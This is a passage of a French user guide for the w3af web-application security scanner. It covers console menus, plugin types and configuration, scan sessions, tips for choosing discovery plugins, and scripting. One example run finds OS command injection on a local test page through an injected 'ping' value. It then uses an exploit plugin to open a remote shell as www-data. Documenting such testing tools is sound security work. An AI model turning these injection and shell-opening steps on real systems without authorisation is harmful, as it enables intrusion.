</p><p class="P40">| exit          | Exit w3af.                           | </p><p class="P40">| assert        | Check assertion.                     | </p><p class="P40">|------------------------------------------------------|  </p><p class="P40">| help          | Display help. issuing: help [command]|</p><p class="P40">|               | , prints more specific help about    |</p><p class="P40">|               | "command"                            | </p><p class="P40">| version       | Show w3af version information.       | </p><p class="P40">| keys          | Display key shortcuts.               | </p><p class="P40">|------------------------------------------------------| </p><p class="P41">w3af&gt;&gt;&gt; </p><p class="P40"><span class="T3">w3af&gt;&gt;&gt;</span> help target</p><p class="P40">Configure the target URL. </p><p class="P41">w3af&gt;&gt;&gt; </p><p class="P41"> </p><p class="P17">Les commandes du menu principal sont expliquées dans l'aide qui est affichée ci-dessus. Le détail de chaque commandes sera décrit plus loin dans ce document. Comme vous l'avez déjà constaté, la commande “help” peut prendre un paramètre, auquel cas, l'aide spécifique à ce paramètre sera affichée, ex: “help keys”. </p><p class="P13">D'autres intéressantes à remarquer au sujet de consoleUI sont la complétion par tabulation (taper 'plu' puis TAB) et l'historique des commandes (après avoir taper quelques commandes; naviguer dans l'historique avec les flèches haut et bas). </p><p class="P13">Pour rentrer dans un menu de configuration; vous n'avez qu'à taper son nom et appuyer sur Entrée, vous verrez alors comment le prompt change et vous serez alors dans ce contexte: </p><p class="P41">w3af&gt;&gt;&gt;<span class="T8">http-settings </span></p><p class="P41">w3af/config:http-settings&gt;&gt;&gt; </p><p class="P12"> </p><p class="P12">Tous les menus de configuration offrent les commandes suvantes: </p><ul style="margin-left:1.25cm;"><li class="P70" style="margin-left:0cm;"><p class="P70" style="margin-left:0.25cm;">help </p></li><li class="P70" style="margin-left:0cm;"><p class="P70" style="margin-left:0.25cm;">view </p></li><li class="P70" style="margin-left:0cm;"><p class="P70" style="margin-left:0.25cm;">set </p></li><li class="P70" style="margin-left:0cm;"><p class="P70" style="margin-left:0.25cm;">back </p></li></ul><p class="P12"> </p><p class="P12">Voici un exemple d'utilisation de ces commandes dans le menu http-settings: </p><p class="P12"> </p><p class="P40"><span class="T3">w3af/config:http-settings&gt;&gt;&gt;</span> help</p><p class="P40">|-------------------------------------------------------------|  </p><p class="P40">| view   | List the available options and their values.       | </p><p class="P40">| set    | Set a parameter value.                             | </p><p class="P40">|-------------------------------------------------------------|  </p><p class="P40">| back   | Go to the previous menu.                           | </p><p class="P40">| exit   | Exit w3af.                                         | </p><p class="P40">| assert | Check assertion.                                   | </p><p class="P40">|-------------------------------------------------------------|  </p><p class="P40"><span class="T3">w3af/config:http-settings&gt;&gt;&gt;</span> view</p><p class="P42">|-------------------------------------------------------------|  </p><p class="P42">| Setting                  | Value              | Description | --------------------------------------------------------------| </p><p class="P42">| timeout                  | 10                 | The         | </p><p class="P42">|                          |                    | timeout     | </p><p class="P42">|                          |                    | for         | </p><p class="P42">|                          |                    | connections |                          |                          |                    | to the      | </p><p class="P42">|                          |                    | HTTP        | </p><p class="P42">|                          |                    | server      | </p><p class="P42">| headersFile              |                    | Set the     | </p><p class="P42">|                          |                    | headers     | </p><p class="P42">|                          |                    | filename.   | </p><p class="P42">|                          |                    | This        | </p><p class="P42">|                          |                    | file        | </p><p class="P42">|                          |                    | has         | </p><p class="P42">|                          |                    | additional  | </p><p class="P42">|                          |                    | headers     | </p><p class="P42">|                          |                    | that        | </p><p class="P42">|                          |                    | are         | </p><p class="P42">|                          |                    | added       | </p><p class="P42">|                          |                    | to each     | </p><p class="P42">|                          |                    | request.    | </p><p class="P42">|-------------------------------------------------------------|  </p><p class="P42">| ignoreSessCookies        | False              | Ignore      | </p><p class="P42">|                          |                    | session     | </p><p class="P42">|                          |                    | cookies     | </p><p class="P42">| cookieJarFile            |                    | Set the     | </p><p class="P42">|                          |                    | cookiejar   | </p><p class="P42">|                          |                    | filename.   | </p><p class="P42">|-------------------------------------------------------------|  </p><p class="P42">... </p><p class="P40"><span class="T3">w3af/config:http-settings&gt;&gt;&gt;</span> set timeout 5</p><p class="P40"><span class="T3">w3af/config:http-settings&gt;&gt;&gt;</span> view</p><p class="P40">... </p><p class="P42">| timeout                  | 5                  | The         | </p><p class="P40">... </p><p class="P40"> </p><p class="P13">Pour résumer, la commande “view” est utilisée pour lister tous les paramètres configurables, avec leurs valeurs et descriptions. La commande “set” est employée pour définir une valeur. Finalement, nous pouvons exécuter “back”, “.” ou appuyer sur CTRL+C pour retourner au menu précédent. Une aide détaillée pour chaque paramètre de configuration peut être obtenue via “help paramètre” comme décrit dans cet exemple: </p><p class="P23"> </p><p class="P40"><span class="T3">w3af/config:http-settings&gt;&gt;&gt;</span> help timeout</p><p class="P40">Help for parameter timeout: </p><p class="P40">=========================== </p><p class="P40">Set low timeouts for LAN use and high timeouts for slow Internet connections. </p><p class="P41">w3af/config:http-settings&gt;&gt;&gt; </p><p class="P14"> </p><p class="P16">Les menus de configuration “http-settings” et “misc-settings” sont utilisés pour définir les paramètres de niveau système utilisés par le framework. Tous les paramètres ont des valeurs par défaut et dans la plupart des cas vous pouvez les laisser comme telles. W3af a été conçu d'une manière qui permet aux débutants de le lancer sans réellement connaitre son fonctionnement interne, et également assez flexible pour être personnalisé par des experts. </p><p class="P15"> </p><h2 class="P33"><a name="Ex_C3_A9cuter_w3af_avec_l_27interface_utilisateur_GTK" />Exécuter w3af avec l'interface utilisateur GTK</h2><p class="P9"> </p><p class="P9">Le framework possède également une interface utilisateur graphique que vous pouvez lancer come ceci: </p><p class="P9"> </p><p class="P40"><span class="T3">$ </span>./w3af_gui</p><p class="P40"> </p><p class="P16">L'interface utilisateur graphique vous permet de réaliser toutes les actions et fonctionnalités offertes par le framework  d'une manière plus simple et rapide pour lancer un scan et analyzer les résultats.</p><p class="P16">Voici une capture d'écran: </p><ul style="margin-left:0.5cm;"><li class="P71" style="margin-left:0cm;"><p class="P71" style="margin-left:0.25cm;"><img width="733" height="492" alt="" src="w3afUsersGuide_fr_html_m51b850c5.png" class="fr1" /></p></li></ul><h3 class="P61"><a name="Plugins" />Plugins</h3><p class="Textbody"> </p><p class="P34">C'est là que la magie s'opère. Les plugins vont découvrir les URLs, trouver les vulnérabilités et les exploiter. Aussi nous allons maintenant apprendre comment les configurer. Dans un chapitre précédent, je vous ai dit que w3af a trois types de plugins: découverte, audit et exploit. En fait j'ai un peu menti car w3af possède d'autres types de plugins. La liste complète des types de plugins est: </p><p class="Textbody"> </p><ul style="margin-left:1.25cm;"><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">discovery </p></li><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">audit </p></li><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">grep </p></li><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">exploit </p></li><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">output </p></li><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">mangle </p></li><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">bruteforce </p></li><li class="P65" style="margin-left:0cm;"><p class="P65" style="margin-left:0.25cm;">evasion </p></li></ul><p class="Textbody"> </p><p class="P34">Comme vu précédemment, les <span class="T1">plugins découverte</span> trouve de nouveaux points d'injection, qui sont ensuite utilisés par les <span class="T1">plugins audit</span> pour trouver des vulnérabilités.</p><p class="P34">Les <span class="T1">plugins grep</span> analysent tout le contenu des pages et trouvent des vulnérabilités sur les pages interrogées par d'autres plugins; par exemple un plugin grep trouvera un commentaire dans le corps HTML qui contient le mot “password” et génère une vulnérabilité basée là dessus.</p><p class="P34">Les <span class="T1">plugins exploit</span> utilisent les vulnérabilités trouvées dans la phase d'uaidt et retournent quelquechose utile à l'utilisateur (shell distant, dump de table SQL, proxy, etc.).</p><p class="P34">Les <span class="T1">plugins output</span> représentent la manière via laquelle le framework et les plugins communiquent avec l'utilisateur. Les plugins output enregistrent les données dans un fichier texte ou HTML. Les informations de débogage sont également envoyées aux plugins et peuvent être sauvegardées pour analyse.</p><p class="P34">Les <span class="T1">plugins mangle</span> sont un moyen de modifier les requêtes et réponses basées sur des expressions régulières, genre “éditeur de flux pour le web”.</p><p class="P34">Les <span class="T1">plugins bruteforce</span> vont réaliser des attaques par force brute contre les indeitifcations, ils sont actuellement une partie de la phase de découverte.</p><p class="P34">Finalement, les <span class="T1">plugins evasion</span> tentent de contourner les règles simples de détection d'intrusion.</p><h3 class="Heading3"><a name="Configuration_de_Plugin" />Configuration de Plugin</h3><p class="P34">Les plugins sont configurés en utilisant le menu de configuration “plugins”. Voyons comment le faire: </p><p class="Textbody"> </p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> help</p><p class="P39">|-------------------------------------------------------------|  </p><p class="P39">| list       | List available plugins.                        | </p><p class="P39">|-------------------------------------------------------------|  </p><p class="P39">| back       | Go to the previous menu.                       | </p><p class="P39">| exit       | Exit w3af.                                     | </p><p class="P39">| assert     | Check assertion.                               | </p><p class="P39">|-------------------------------------------------------------|  </p><p class="P39">| mangle     | View, configure and enable mangle plugins      | </p><p class="P39">| evasion    | View, configure and enable evasion plugins     | </p><p class="P39">| discovery  | View, configure and enable discovery plugins   | </p><p class="P39">| grep       | View, configure and enable grep plugins        | </p><p class="P39">| bruteforce | View, configure and enable bruteforce plugins  | </p><p class="P39">| audit      | View, configure and enable audit plugins       | </p><p class="P39">| output     | View, configure and enable output plugins      | </p><p class="P39">|-------------------------------------------------------------|  </p><p class="P43">w3af/plugins&gt;&gt;&gt; </p><p class="P21"> </p><p class="P19">Vous vous avez pu le constater, tous les plugins peuvent être configurés ici à l'exception des plugins exploit, nous en reparlerons plus tard. La première étape ici est de voir la syntaxe pour configurer les plugins, voyons ça: </p><p class="P18"> </p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> help audit</p><p class="P45">View, configure and enable audit plugins  </p><p class="P45">Syntax: audit [config plugin | plugin1[,plugin2 ... pluginN] | desc plugin]  </p><p class="P45">Example: audit  </p><p class="P45">Result: All enabled audit plugins are listed.  </p><p class="P45"> </p><p class="P45">Example2: audit LDAPi,blindSqli  </p><p class="P45">Result: LDAPi and blindSqli are configured to run  </p><p class="P45" /><p class="P45">Example3: audit config LDAPi  </p><p class="P45">Result: Enters to the plugin configuration menu.  </p><p class="P45"> </p><p class="P45">Example4: audit all,!blindSqli  </p><p class="P45">Result: All audit plugins are configured to run except blindSqli.  </p><p class="P45"> </p><p class="P45">Example1: audit desc LDAPi  </p><p class="P45">Result: You will get the plugin description  </p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> help list</p><p class="P45">List available plugins.  </p><p class="P45">Syntax: list {plugin type} [all | enabled | disabled]  </p><p class="P45">By default all plugins are listed.  </p><p class="P45"> </p><p class="P43">w3af/plugins&gt;&gt;&gt; </p><p class="P43"> </p><p class="P19">Ok, w3af est assez sympa pour nous dire comment l'utiliser. Maintenant nous allons voir comment obtenir la liste des plugins disponibles et leur statut: </p><p class="P46"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> list audit</p><p class="P46">|------------------------------------------------------------|  </p><p class="P46">| Plugin name       | Status  | Conf | Description           | </p><p class="P46">|------------------------------------------------------------|  </p><p class="P46">| LDAPi             |         |      | Find LDAP injection   | </p><p class="P46">|                   |         |      | bugs.                 | </p><p class="P46">| blindSqli         |         | Yes  | Find blind SQL        | </p><p class="P46">|                   |         |      | injection             | </p><p class="P46">|                   |         |      | vulnerabilities.      | </p><p class="P46">| buffOverflow      |         |      | Find buffer overflow  | </p><p class="P46">|                   |         |      | vulnerabilities.      | </p><p class="P46">| dav               |         |      | Tries to upload a     | </p><p class="P46">|                   |         |      | file using HTTP PUT   | </p><p class="P46">|                   |         |      | method.               | </p><p class="P46">| eval              |         |      | Finds incorrect usage | </p><p class="P46">|                   |         |      | of the eval().        | </p><p class="P46">... </p><p class="P46" /><p class="P19">Pour activer les plugins xss et sqli, puis vérifier que la commande a été comprise par le framework, nous exécutons les commandes suivantes: </p><p class="P18"> </p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit xss, sqli</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit</p><p class="P45">|------------------------------------------------------------|  </p><p class="P45">| Plugin name       | Status  | Conf | Description           | </p><p class="P45">|------------------------------------------------------------|  </p><p class="P45">... </p><p class="P45">| sqli              | Enabled |      | Find SQL injection    | </p><p class="P45">|                   |         |      | bugs.                 | </p><p class="P45">... </p><p class="P45">| xss               | Enabled | Yes  | Find cross site       | </p><p class="P45">|                   |         |      | scripting             | </p><p class="P45">|                   |         |      | vulnerabilities.      | </p><p class="P45">| xst               |         |      | Verify Cross Site     | </p><p class="P45">|                   |         |      | Tracing               | </p><p class="P45">|                   |         |      | vulnerabilities.      | </p><p class="P45">|------------------------------------------------------------|  </p><p class="P43">w3af/plugins&gt;&gt;&gt; </p><p class="P18"> </p><p class="P7">Ou, si l'utilisateur est intéressé par savoir exactement ce que fait un plugin, il peut aussi utiliser la commande “desc” comme ceci: </p><p class="P18"> </p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit desc fileUpload</p><p class="P45"> </p><p class="P45">This plugin will try to expoit insecure file upload forms. </p><p class="P45"> </p><p class="P53">               One configurable parameter exists:</p><p class="P53">                        - extensions</p><p class="P45"> </p><p class="P45">The extensions parameter is a comma separated list of extensions that this plugin will try to upload. Many web applications              verify the extension of the file being uploaded, if special extensions are required, they can be added here.</p><p class="P22"> </p><p class="P45">Some web applications check the contents of the files being uploaded to see if they are really what their extension                is telling. To bypass this check, this plugin uses file templates located at "plugins/audit/fileUpload/", this templates</p><p class="P45">are valid files for each extension that have a section ( the comment field in a gif file for example ) that can be replaced </p><p class="P22">     by scripting code ( PHP, ASP, etc ).</p><p class="P22"> </p><p class="P45">After uploading the file, this plugin will try to find it on common directories like "upload" and "files" on every know directory. If the file is found, a vulnerability exists. </p><p class="P45"> </p><p class="P43">w3af/plugins&gt;&gt;&gt; </p><p class="P18"> </p><p class="P19">Maintenant nous savons ce que fait ce plugin, mais voyons ce qu'il a dans le ventre: </p><p class="P18"> </p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit config xss</p><p class="P45"><span class="T3">w3af/plugins/audit/config:xss&gt;&gt;&gt; </span>view</p><p class="P45">|------------------------------------------------------------|  </p><p class="P45">| Setting         | Value | Description                      | </p><p class="P45">|------------------------------------------------------------|  </p><p class="P45">| checkPersistent | True  | Search persistent XSS            | </p><p class="P45">| numberOfChecks  | 2     | Set the amount of checks to      | </p><p class="P45">|                 |       | perform for each fuzzable        | </p><p class="P45">|                 |       | parameter. Valid numbers: 1 to   | </p><p class="P45">|                 |       | 10                               | </p><p class="P45">|------------------------------------------------------------|  </p><p class="P45"><span class="T3">w3af/plugin/xss&gt;&gt;&gt; </span>set checkPersistent False</p><p class="P45"><span class="T3">w3af/plugin/xss&gt;&gt;&gt;</span> back</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit config sqli</p><p class="P45"><span class="T3">w3af/plugins/audit/config:sqli&gt;&gt;&gt; </span>view </p><p class="P45">|------------------------------------------------------------|  </p><p class="P45">| Setting          | Value       | Description               | </p><p class="P45">|------------------------------------------------------------|  </p><p class="P45">|------------------------------------------------------------| </p><p class="P43">w3af/plugins/audit/config:sqli&gt;&gt;&gt;  </p><p class="P43">w3af/plugins&gt;&gt;&gt; </p><p class="P18"> </p><p class="P19">Les menus de configuration pour les plugins possèdent également un ensemble de commandes pour modifier les valeurs de paramètres, et la commande “view” pour lister les valeurs actuelles. Dans l'exemple précédent, nous avons désactivé les vérifications de cross site scripting persistants dans le plugin xss, et avons listé les options du plugin sqli (il n'a actuellement aucun paramètres configurables). </p><p class="P18"> </p><h2 class="P59"><a name="D_C3_A9marrer_un_scan" />Démarrer un scan</h2><p class="P18"> </p><p class="P19">Après avoir configuré tous les plugins désirés, l'utilisateur doit définir l'URL cible et enfin démarrer le scan. Le choix de la cible se fait comme ceci: </p><p class="P18"> </p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> target</p><p class="P45"><span class="T3">w3af/config:target&gt;&gt;&gt; </span>set target http://localhost/</p><p class="P45"><span class="T3">w3af/config:target&gt;&gt;&gt;</span> back</p><p class="P43">w3af&gt;&gt;&gt; </p><p class="P21"> </p><p class="P18">Enfin, vous lancez “start” et le processus va lancer tous les plugins. </p><p class="P18"> </p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P18"> </p><h3 class="P61"><a name="Une_session_compl_C3_A8te" />Une session complète</h3><p class="P18"> </p><p class="P19">Une session w3af complète ressemblera à ceci (voir les commentaires): </p><p class="P18"> </p><p class="P45"><span class="T3">$</span> ./w3af</p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output console,textFile</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config textFile</p><p class="P45"><span class="T3">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set fileName output-w3af.txt</p><p class="P45"><span class="T3">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> set verbose True</p><p class="P45"><span class="T3">w3af/plugins/output/config:textFile&gt;&gt;&gt;</span> back</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> output config console</p><p class="P45"><span class="T3">w3af/plugins/output/config:console&gt;&gt;&gt;</span> set verbose False</p><p class="P45"><span class="T3">w3af/plugins/output/config:console&gt;&gt;&gt;</span> back</p><p class="P18"> </p><p class="P19">Toutes les commandes précédentes ont activé deux plugins output: console et textFile et les ont configurés comme de besoin. </p><p class="P18"> </p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> discovery allowedMethods,webSpider</p><p class="P45"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back</p><p class="P45"> </p><p class="P19">Dans ce cas, nous allons lancer uniquement des plugins découverte. Les plugins activés sont allowedMethods et webSpider. </p><p class="P45"> </p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> target</p><p class="P45"><span class="T3">w3af/target&gt;&gt;&gt;</span>set target http://localhost/w3af/</p><p class="P45"><span class="T3">w3af/target&gt;&gt;&gt;</span>back</p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P45">New URL found by discovery: http://localhost/w3af/responseSplitting/responseSplitting.php </p><p class="P45">New URL found by discovery: http://localhost/w3af/blindSqli/blindSqli-str.php </p><p class="P45">New URL found by discovery: http://localhost/w3af/webSpider/2.html </p><p class="P45">...</p><p class="P45">... </p><p class="P45">The URL: http://localhost/beef/hook/ has DAV methods enabled: </p><p class="P45">- OPTIONS </p><p class="P45">- GET </p><p class="P45">- HEAD </p><p class="P45">- POST </p><p class="P45">- TRACE </p><p class="P45">- PROPFIND </p><p class="P45">- PROPPATCH </p><p class="P45">- COPY </p><p class="P45">- MOVE </p><p class="P45">- LOCK </p><p class="P45">- UNLOCK </p><p class="P45">- DELETE ( is possibly enabled too, not tested for safety ) </p><p class="P45">New URL found by discovery: http://localhost/w3af/globalRedirect/wargame/ </p><p class="P45">New URL found by discovery: http://localhost/w3af/globalRedirect/w3af-site.tgz </p><p class="P45"> </p><p class="P19">Après la fin de la phase de découverte, un résumé est présenté à l'utilisateur: </p><p class="P45"> </p><p class="P45">The list of found URLs is: </p><p class="P45">- http://localhost/w3af/globalRedirect/w3af.testsite.tgz </p><p class="P45">- http://localhost/beef/hook/beefmagic.js.php </p><p class="P45">- http://localhost/w3af/globalRedirect/2.php </p><ul style="margin-left:0.5cm;"><li class="P81" style="margin-left:1.25cm;"><p class="P81" style="margin-left:0.25cm;">http://localhost/w3af/webSpider/11.html </p><p class="P81" style="margin-left:0.25cm;">... </p></li></ul><p class="P22"> </p><p class="P19">Une section du résumé présente les points d'injection qui vont être utilisés durant la phase d'audit: </p><p class="P22"> </p><p class="P45">Found 78 URLs and 102 different points of injection. </p><p class="P45">The list of Fuzzable requests is: </p><p class="P45">- http://localhost/w3af/ | Method: GET </p><p class="P45">- http://localhost/w3af/responseSplitting/responseSplitting.php | Method: GET | Parameters: (header)</p><ul style="margin-left:0.5cm;"><li class="P82" style="margin-left:1.25cm;"><p class="P82" style="margin-left:0.25cm;">http://localhost/w3af/sqli/dataReceptor.php | Method: POST | Parameters: (user,firstname) </p></li></ul><p class="P19">Enfin, l'utilisateur quitte l'application, retournant au shell et à la vie réelle. </p><p class="P18"> </p><p class="P45"><span class="T3">w3af&gt;&gt;&gt;</span> exit</p><p class="P45">w3af, better than the regular script kiddie. </p><p class="P43">$ </p><p class="P22"> </p><h2 class="P59"><a name="Avertissement_sur_la_d_C3_A9couverte" />Avertissement sur la découverte</h2><p class="Textbody"> </p><p class="Textbody">La phase de découverte est a double tranchants: l'utiliser avec bon sens, et elle vous donnera beaucoup d'informations sur l'application web distante, l'utiliser en étant trop gourmand et vous attendrez de longues heures avant qu'elle ne s'achève. Juste pour être clair; être trop gourmand est d'activer tous les plugins découverte (“discovery all”) sans même savoir ce que vous faites ou avoir visité manuellement le site et compris son fonctionnement. </p><p class="Textbody">Quelques exemples vont rendre les choses plus claires: </p><ul style="margin-left:1.25cm;"><li class="P67" style="margin-left:0cm;"><p class="P67" style="margin-left:0.25cm;">“Vous testez une application web en intranet, l'applicatif web est énorme et n'utilise aucun code macromedia flash ou javascript”. </p><p class="P67" style="margin-left:0.25cm;"><span class="T1">Recommandation :</span> “discovery all,!spiderMan, !fingerGoogle, !fingerMSN, !fingerPKS, !MSNSpider, !googleSpider, !phishtank, !googleSafeBrowsing”.</p><p class="P68" style="margin-left:0.25cm;">Raison: <span class="T2">Spiderman ne doit être utilisé uniquement quand webSpider ne peut pas trouver tous les liens. Les plugins fingerGoogle, fingerMSN et fingerPKS découvrent les adresses mails à partir des moteurs de recherche, s'il s'agit d'un intranet; les adresses du site ne devraient pas être disponibles à partir des moteurs de recherche internet, car jamais indexés. MSNSpider et googleSpider trouvent les URLs en utilisant les moteurs de recherche internet, pour la même raison que précédemment, ils sont inutiles dans ce cas de figure du fait que les moteurs de recherche internet n'indexent pas les pages privées. phishtank et googleSafeBrowsing devraient être désactivés car ils recherchent des sites de phishing, pour la même raison (Tu quoque, mi fili!).</span></p><p class="P66" style="margin-left:0.25cm;"> </p></li><li class="P66" style="margin-left:0cm;"><p class="P66" style="margin-left:0.25cm;">“Vous testez une application web via internet, l'applicatif web est énorme et n'utilise ni code macromedia flash, ni javascript.” </p><p class="P66" style="margin-left:0.25cm;"><span class="T1">Recommandation</span> : “discovery all,!spiderMan, !wordnet , !googleSets”.</p><p class="P68" style="margin-left:0.25cm;">Raison: <span class="T2">Spiderman ne doit être utilisé uniquement quand webSpider ne peut pas trouver tous les liens. Les plugins wordnet et googleSets sont deux plugins qui prennent du temps à s'exécuter via internet, il est donc judicieux de les désactiver.</span></p><p class="P66" style="margin-left:0.25cm;"> </p></li><li class="P66" style="margin-left:0cm;"><p class="P66" style="margin-left:0.25cm;">“Vous testez une application web via internet, l'applicatif web est énorme et contient du code macromedia flash ou javascript. Vous savez aussi que l'applicatif n'implémente pas de web services.” </p><p class="P66" style="margin-left:0.25cm;"><span class="T1">Recommandation</span> : “discovery all, !wordnet , !googleSets, !wsdlFinder”.</p><p class="P68" style="margin-left:0.25cm;">Raison: <span class="T2">Les plugins wordnet et googleSets sont deux plugins qui prennent du temps à s'exécuter via internet, il est donc judicieux de les désactiver. Pour ce qui est de wsdlFinder; si nous savons déjà qu'aucun web services n'est implémenté, pourquoi en chercher?</span></p><p class="P66" style="margin-left:0.25cm;" /></li><li class="P66" style="margin-left:0cm;"><p class="P66" style="margin-left:0.25cm;">“Vous testez une application web via internet, l'applicatif web est énorme, vous avez vraiment besoin de connaitre tous les liens et fonctionnalités du site et vous avez tout votre temps.” </p><p class="P66" style="margin-left:0.25cm;"><span class="T1">Recommandation</span> : “discovery all” .</p><p class="P68" style="margin-left:0.25cm;">Raison: <span class="T2">Vous devez absolument obtenir beaucoup d'informations sur le site, et vous pouvez y passer une journée.</span></p></li></ul><h3 class="Heading3"><a name="Quand_tout_le_reste__C3_A9choue..." />Quand tout le reste échoue...</h3><p class="P35">Vous avez activez uniquement les plugins recommandés dans la phase de découverte, vous avez lancé le framework il y a de ça une heure, la découverte tourne encore et ne trouve rien. Quand vous vous retrouvez dans cette situation, vous avez deux options; attendre que w3af s'arrête ou appuyer sur CTRL+C pour interrompre la découverte et lancer la phase d'audit. </p><p class="P35">Vous devez aussi vous souvenir que si vous sauvegardez les informations de débogage dans un fichier texte; vous pouvez ouvrir un nouveau terminal et lancer un “tail -f w3af-output-file.txt” pour voir ce qui se passe. </p><h2 class="Heading2"><a name="Scripts_w3af" />Scripts w3af</h2><p class="Textbody"> </p><p class="P34">w3af peut exécuter un fichier script via l'argument “-s”. Les scripts sont utiles pour exécuter les mêmes étapes à plusieurs reprises. Les fichiers de script sont des fichiers texte avec une commande par ligne. </p><p class="P34">Un exempel de script ressemblera à ceci: </p><p class="Textbody"> </p><p class="P39"><span class="T3">$</span> head scripts/script-osCommanding.w3af</p><p class="P39"># This is the osCommanding demo: </p><p class="P39"> </p><p class="P39">plugins </p><p class="P39">output console,textFile </p><p class="P39">output </p><p class="P39">output config textFile </p><p class="P39">set fileName output-w3af.txt </p><p class="P39">set verbose True </p><p class="P39">back </p><p class="P39"> </p><p class="P20">Pour lancer ce script, vous excuteriez “./w3af_console -s scripts/script-osCommanding.w3af”, la sortie sera la même que si vous tappiez chaque commande à la main dans la console: </p><p class="P11" /><p class="P39"><span class="T3">$</span> ./w3af_console -s scripts/script-osCommanding.w3af</p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">plugins </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">output console,textFile </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">output</span> </p><p class="P45">|-----------------------------------------------------------|  </p><p class="P45">| Plugin    | Status  | Conf | Description                  | </p><p class="P45">| name      |         |      |                              | </p><p class="P45">|-----------------------------------------------------------|  </p><p class="P45">| console   | Enabled | Yes  | Print messages to the        | </p><p class="P45">|           |         |      | console.                     | </p><p class="P45">| gtkOutput |         |      | Saves messages to            | </p><p class="P45">|           |         |      | kb.kb.getData('gtkOutput',   | </p><p class="P45">|           |         |      | 'queue'), messages are saved | </p><p class="P45">|           |         |      | in the form of objects.      | </p><p class="P45">| htmlFile  |         | Yes  | Print all messages to a HTML | </p><p class="P45">|           |         |      | file.                        | </p><p class="P45">| textFile  | Enabled | Yes  | Prints all messages to a     | </p><p class="P45">|           |         |      | text file.                   | </p><p class="P45">| webOutput |         |      | Print all messages to the    | </p><p class="P45">|           |         |      | web user interface - this    | </p><p class="P45">|           |         |      | plugin and the web user      | </p><p class="P45">|           |         |      | interface are DEPRECATED.    | </p><p class="P45">|-----------------------------------------------------------|  </p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">output config textFile </span></p><p class="P43">w3af/plugins/output/config:textFile&gt;&gt;&gt;<span class="T8">set fileName output-w3af.txt </span></p><p class="P43">w3af/plugins/output/config:textFile&gt;&gt;&gt;<span class="T8">set verbose True </span></p><p class="P43">w3af/plugins/output/config:textFile&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">output config console </span></p><p class="P43">w3af/plugins/output/config:console&gt;&gt;&gt;<span class="T8">set verbose False </span></p><p class="P43">w3af/plugins/output/config:console&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">plugins </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">audit osCommanding </span></p><p class="P43">w3af/plugins&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">target </span></p><p class="P43">w3af/config:target&gt;&gt;&gt;<span class="T8">set target http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9 </span></p><p class="P43">w3af/config:target&gt;&gt;&gt;<span class="T8">back </span></p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">start </span></p><p class="P45">Found 1 URLs and 1 different points of injection.  </p><p class="P45">The list of URLs is:  </p><p class="P45">- http://localhost/w3af/osCommanding/vulnerable.php  </p><p class="P45">The list of fuzzable requests is:  </p><p class="P45">- http://localhost/w3af/osCommanding/vulnerable.php | Method: GET | Parameters: (command)  </p><p class="P45">Starting osCommanding plugin execution.  </p><p class="P45">OS Commanding was found at: "http://localhost/w3af/osCommanding/vulnerable.php", using HTTP method GET. The sent data was: "command=+ping+-c+9+localhost". The vulnerability was found in the request with id 5.  </p><p class="P45">Finished scanning process.  </p><p class="P43">w3af&gt;&gt;&gt;<span class="T8">exploit </span></p><p class="P43">w3af/exploit&gt;&gt;&gt;<span class="T8">exploit osCommandingShell </span></p><p class="P45">osCommandingShell exploit plugin is starting.  </p><p class="P45">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P45">Vulnerability successfully exploited. This is a list of available shells:  </p><p class="P45">- [0] &lt;osCommandingShell object (ruser: "www-data" | rsystem: "Linux brick 2.6.24-19-generic i686 GNU/Linux")&gt;  </p><p class="P45">Please use the interact command to interact with the shell objects.  </p><p class="P43">w3af/exploit&gt;&gt;&gt;<span class="T8">interact 0 </span></p><p class="P45">Execute "endInteraction" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p 